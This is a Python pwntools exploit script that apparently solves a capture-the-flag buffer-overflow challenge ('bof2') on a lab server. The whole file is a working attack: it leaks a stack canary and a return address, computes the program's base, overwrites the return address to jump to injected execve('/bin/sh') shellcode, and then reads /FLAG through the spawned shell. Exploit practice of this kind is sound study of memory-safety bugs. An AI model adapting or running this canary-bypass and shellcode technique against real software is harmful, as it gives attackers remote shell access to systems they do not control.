#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

# Server details
exe = './bof2'
port = 10259

# Define shellcode for spawning /bin/sh
shellcode = asm('''
    mov rax, 59
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

# Function to solve the challenge
def solve_challenge():
    print(r.recvuntil(b"What's your name? "))
    r.send(b'A' * 41)  # Overflow buffer to reach canary

    recv = r.recvline()
    print(recv)
    can = u64(recv[49:57].strip().ljust(8, b'\x00'))
    # Do masking to get the canary
    #cal = p64(can)
    print(f"Leaked canary: {hex(can)}")
    cana = can & 0xffffffffffffff00
    canary = p64(cana)
    print(f"New Leaked canary: {hex(cana)}")
    print(f"New Leaked canary: {canary}")

    r.recvuntil(b"number? ")
    #r.send(payload)
    r.send(b'A' * 56)  # Overflow buffer to reach canary
    recv = r.recvline()
    print(recv)
    m160 = u64(recv[76:83].strip().ljust(8, b'\x00'))
    print("m160", hex(m160))

    base_addr = m160 - off_main - 160
    msg_addr = base_addr + 0xd31e0

    new_addr = p64(msg_addr)
    payload = b'A' * 40 + canary + b'A' * 8 + new_addr

    r.recvuntil(b"name? ")
    r.send(payload)
    r.recvuntil(b"message: ")
    r.send(shellcode)

    # Interact with the shell and get the flag
    r.sendline(b"cat /FLAG")
    r.interactive()

solve_challenge()
